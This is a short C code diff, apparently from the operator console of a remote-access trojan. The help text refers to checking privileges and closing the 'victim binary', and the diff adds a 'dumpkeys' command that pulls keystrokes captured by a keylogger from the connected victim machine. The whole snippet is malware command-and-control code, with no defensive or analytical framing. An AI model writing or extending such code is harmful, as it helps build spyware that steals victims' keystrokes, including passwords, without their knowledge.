@@ -139,6 +139,8 @@ void helpPannel(){
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] check                 -> Check privileges\n");
     printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] dumpkeys              -> Dump key recorded by keylogger\n");
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q -y / exit -y        -> Terminate the conection (close victim binary)\n");
@@ -496,6 +498,9 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
         
             }else if (strcmp(command, "record") == 0) { 
                 startRecord(command, targetConn, clientIP); 
+
+            }else if (strcmp(command, "dumpkeys") == 0) { 
+                downloadFunc("download keylog", targetConn, clientIP); 
 
             }
             else {
